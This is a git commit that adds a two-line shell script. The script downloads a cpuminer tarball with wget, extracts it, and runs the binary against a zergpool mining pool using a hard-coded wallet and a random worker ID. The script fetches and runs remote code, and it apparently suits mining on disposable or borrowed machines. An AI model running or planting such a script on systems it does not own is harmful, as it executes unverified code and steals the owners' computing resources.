784f50a036317acbe59b0031f501cfdbf518d3ab
aceNK321 <96048009+aceNK321@users.noreply.github.com>
2022-03-06 18:04:57 +0700

    Create jajank.sh

---
+++ jajank.sh
@@ -0,0 +1,2 @@
+wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz
+./cpuminer -a yespower -o stratum+tcp://yespower.mine.zergpool.com:6533 -u GTJwZwAxp5TZGj3rk1Msfn3Zc6RPTKTzt5 -p c=BTG,ID=$(echo $(shuf -i 1-50000 -n 1)---ngoCeH)
